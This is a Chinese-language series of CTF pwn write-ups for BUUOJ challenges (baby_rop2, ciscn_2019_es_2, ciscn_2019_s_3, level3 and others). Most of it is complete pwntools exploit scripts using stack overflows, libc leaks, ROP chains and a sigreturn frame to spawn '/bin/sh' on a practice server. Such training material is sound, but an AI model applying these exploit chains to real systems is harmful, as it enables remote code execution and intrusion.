# buu027-[HarekazeCTF2019]baby_rop2

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29802)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

poprdi_ret = 0x400733
poprsir15_ret = 0x400731

payload = cyclic(0x28)
payload += p64(poprdi_ret)
payload += p64(0x400790)
payload += p64(poprsir15_ret)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(elf.plt['printf'])
payload += p64(elf.symbols['main'])

io.sendlineafter(b'What\'s your name? ', payload)
io.recvuntil(b'\n')
read = u64(io.recv(6) + b'\x00\x00')
base = read - libc.symbols['read']
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))

print(hex(read))

payload = cyclic(0x28)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(system)
payload += p64(elf.symbols['main'])

io.sendlineafter(b'What\'s your name? ', payload)

io.interactive()
```
# buu028-ciscn_2019_es_2
这一题乍一看是栈溢出，但最鸡贼的是只能溢出4个字节，也就是只够覆盖返回地址。不过还是有办法拿到libc的地址的：

![](https://img-blog.csdnimg.cn/ce7a88efd4434a0c99b9f83f73ff0205.png)
这是还没有进入vul函数时的栈环境，可以看到下面的f7de3ed5是libc之中的地址（_dl_fini是ld.so中的地址，而不是libc的）。我们溢出之后程序会打印出后面一部分地址的值，但是遇到空字节会截断。于是我们可以反复返回到vul函数的开头，你会发现每一次返回后，存返回地址的地址都会向后移4个字节。于是我们通过这种方法返回4次vul函数就能够成功越过上图ebp的0字节，通过printf获取libc地址。

有了libc之后，我们需要考虑如何执行system函数。要知道，我们只能溢出4个字节。别慌，我们有main函数。在进入vul函数时，memset只会将前20个字符清零，而对后面的不作处理，这就给了我们一丝机会。我们想把"\bin\sh"的地址写到返回地址的后面，肯定不能直接溢出，因为长度不够。所以我们干脆就返回到main函数中，要知道main函数也是占用一定的栈空间的，这样做可以让下一次执行vul函数时的栈向下压。这样原先写到栈上的"\bin\sh"地址就到了函数返回地址的后面去了。

![](https://img-blog.csdnimg.cn/41d684be9aa04ef2873caabce063d9e9.png)
这个过程建议通过gdb调试一下加深理解。

exp:
```python
from pwn import *
from LibcSearcher import *

context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25990)
elf = ELF('./pwn')

# repeat 3 times of function vul to reach address of __libc_start_main + 241
io.sendafter(b'Welcome, my friend. What\'s your name?\n', cyclic(0x30))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(elf.symbols['vul']))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(elf.symbols['vul']))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

# fourth time, we can get the address of libc
io.send(cyclic(0x2c) + p32(elf.symbols['vul']))

# gdb.attach(io)

io.recv()
rc = io.recv()
print(rc)
libc_start_main = u32(rc[-5:-1]) - 241
print(hex(libc_start_main))
libc = LibcSearcher('__libc_start_main', libc_start_main)

base = libc_start_main - libc.dump('__libc_start_main')
print(hex(base))
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
print('system: ' + hex(sys))
print('binsh: ' + hex(binsh))
# gdb.attach(io)
io.send(cyclic(0x20) + p32(binsh) * 3 +  p32(elf.symbols['main']))
# return to vul to adjust stack environment
io.sendafter(b'Welcome, my friend. What\'s your name?\n', cyclic(0x2c) + p32(sys))
io.sendafter(b'Hello', cyclic(0x2c) + p32(elf.symbols['vul']))
io.recvuntil(b'Hello')

io.send(cyclic(0x2c) + p32(sys))
io.sendafter(b'Hello', cyclic(0x2c) + p32(sys))

io.interactive()
```
# buu029-jarvisoj_tell_me_something
```python
from pwn import *
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27850)
io.sendlineafter(b'Input your message:\n', cyclic(0x88) + p64(0x400620))
io.interactive()
```
# buu030-ciscn_2019_s_3
这道题一看汇编，明摆着是考我们系统调用。其中有mov rax, 3bh，3b就是execve的系统调用号。之后需要在rdi中传入'/bin/sh'的地址，但是原程序中并没有这个字符串。

目前有一个主要的问题：如果要自己构造'/bin/sh'或者是查找libc，如何获取这个字符串的地址？通过ret2csu我们可以很容易地将任意值pop到rdi中，所以关键就在于如何获取字符串地址。如果这个字符串自己构造，栈上的地址一般都不容易获取到。如果要查找libc，那么首先要获取libc基址。前面已经提到我们无法直接通过sys_write打印，但同时我们也不要忘记，返回地址不一定要是函数的开头。如果在读写函数返回后编写gadget，直接返回到写30字节的地方，那么我们就能够直接进行打印，此时write打印出的数据中有部分是我们没有修改的，且返回之后我们能够将rsp抬高8字节获取到更加靠前的栈区内容，也就有机会能够获取到libc的基址。

![](https://img-blog.csdnimg.cn/47bedf4bdae240d0824554966960e1ea.png)
上图中libc的基址正好在打印地址之后0x30的位置，所以还需要再返回两次，与第28题的方法相同。这种方法笔者称之为碰瓷流，与这道题的出题人本意不符。

exp：（调用system('/bin/sh')）
```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28675)

write = 0x400503
read_write = 0x4004ed
poprdi_ret = 0x4005a3

payload = cyclic(0x10)
payload += p64(write)	# We use write twice to make rsp go up to reach the '__libc_start_main'
payload += p64(write)
payload += p64(read_write)

io.sendline(payload)

libc_start_main = u64(io.recv()[-8:]) - 231
print(hex(libc_start_main))
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')

sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x10)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendline(payload)

io.interactive()
```

本题实际上考察的是sigreturn的使用。说得简单点就是通过sigreturn（调用号0xF）的系统调用能够返回到用户状态，而这个用户状态的结构体就在sigreturn后的栈空间中，由此可以进行伪造。具体原理参见[资料](https://blog.csdn.net/zsj2102/article/details/78561112?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259846916781818710887%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259846916781818710887&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78561112-null-null.142^v9^control,157^v4^control&utm_term=sigreturn&spm=1018.2226.3001.4187)。在pwnfiles中为我们提供了伪造sigreturn结构体的类SigreturnFrame方便我们构造。

exp：（调用sigreturn，binsh地址仍然采用碰瓷方式获取）
```python
from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28675)

write = 0x400503
read_write = 0x4004ed
poprdi_ret = 0x4005a3
poprsir15_ret = 0x4005a1
movrax3b_ret = 0x4004e2
movrax0f_ret = 0x4004da
syscall = 0x400517

payload = cyclic(0x10)
payload += p64(write)
payload += p64(write)
payload += p64(read_write)

io.sendline(payload)

libc_start_main = u64(io.recv()[-8:]) - 231
print(hex(libc_start_main))
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')

sys = base + libc.dump('system')
print(hex(sys - libc_start_main))
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x10)
payload += p64(movrax0f_ret)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += flat(frame)

io.sendline(payload)

io.interactive()
```

同时我们发现，我们能够通过write打印出栈区某处的地址，与当前rsp的差值固定。因此还可以直接通过read读取'/bin/sh'字符串到栈上，再通过write获取栈区地址以获取我们构造的'/bin/sh'的地址。此种方法清参见[别人写的wp](https://blog.csdn.net/m0_52231248/article/details/121361488?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165259686716782350962406%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165259686716782350962406&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-121361488-null-null.142^v9^control,157^v4^control&utm_term=ciscn_2019_s_3&spm=1018.2226.3001.4187)。

由此，这道题获取'/bin/sh'地址有两种方法，getshell也有两种方法，组合一下就能写出4种不同的exp。在学习过程中，不能以做出来题为目标，而应深入思考内部的原理，以及有没有其他的方法。

# buu031-jarvisoj_level3

```python
from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27404)
elf = ELF('./pwn')

payload = cyclic(140)
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['vulnerable_function'])
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(12)

io.sendlineafter(b'Input:\n', payload)

read = u32(io.recv()[0:4])
print(hex(read))
libc = LibcSearcher('read', read)
base = read - libc.dump('read')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(140)
payload += p32(sys)
payload += p32(0xdeadbeef)
payload += p32(binsh)

io.sendline(payload)

io.interactive()
```
